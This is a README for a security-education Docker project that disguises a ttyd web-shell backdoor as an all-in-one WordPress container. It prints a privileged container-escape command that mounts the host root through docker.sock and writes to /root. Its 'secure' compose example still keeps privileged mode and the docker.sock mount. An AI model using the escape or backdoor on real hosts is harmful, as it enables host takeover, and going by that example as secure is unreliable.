> 🇺🇸 English version → [README.md](./README.md)
> 🇯🇵 日本語版はこちら → [README.ja.md](./README.ja.md)

# 🐳 all-in-one-wordpress (Backdoor Demo Project)

This project is an educational demonstration of **how a malicious container image can compromise the host system**. It features an all-in-one Docker container that looks like a WordPress environment, but hides a `ttyd` shell backdoor. It also demonstrates how developers can safely access containers using SSH LocalForwarding to avoid being exploited.

---

## 📦 Project Structure

```text
.
├── Dockerfile           # WordPress + ttyd + Apache reverse proxy
├── docker-compose.yml   # Mounts docker.sock & runs in privileged mode
├── init.sql             # Initial database setup for WordPress
├── supervisord.conf     # Supervisor config to launch MariaDB, Apache, and ttyd
├── README.md            # This file
```

---

## 🚀 Quick Start (for local testing only)

### 1. Build

```bash
docker compose build
```

### 2. Launch

```bash
docker compose up -d
```

### 3. Secure Access via SSH LocalForwarding

```bash
ssh -L 8888:127.0.0.1:8899 root@your.server.ip
```

Open your browser and navigate to:

```
http://localhost:8888/shell/
```

---

## 🧨 From the Attacker's Perspective

If the `docker-compose.yml` is configured like this:

```yaml
ports:
  - "0.0.0.0:8899:8080"
```

Then an attacker could simply visit:

```
http://<your-public-ip>:8899/shell/
```

to access a web-based Bash shell.

Worse, if the container runs with `--privileged` and mounts `/var/run/docker.sock`, the attacker could execute:

```bash
docker run --rm -it --privileged -v /:/mnt alpine \
  chroot /mnt /bin/bash -c "echo 'You are hacked' | wall; touch /root/OWNED-$(whoami)"
```

* A file will be created on the host at `/root`
* All logged-in users will see a broadcast message

---

## 🛡️ How Developers Can Protect Themselves

* Avoid using untrusted Docker images
* Do not expose container ports publicly
* Bind to `127.0.0.1` and use SSH LocalForwarding for access

### Example of a Secure `docker-compose.yml`:

```yaml
services:
  wp:
    image: wp-with-backdoor
    ports:
      - "127.0.0.1:8899:8080"  # Localhost only
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock
    privileged: true
```

---

## 📚 Further Reading

This project is accompanied by a blog post for deeper understanding:

👉 [Container-backdoor-ssh.md](./Container-backdoor-ssh.md)

---

## ⚠️ Disclaimer

This project is for **security education and demonstration purposes only**. Do not use it in production environments.

The author is not responsible for any damage caused by misuse of this project.

---
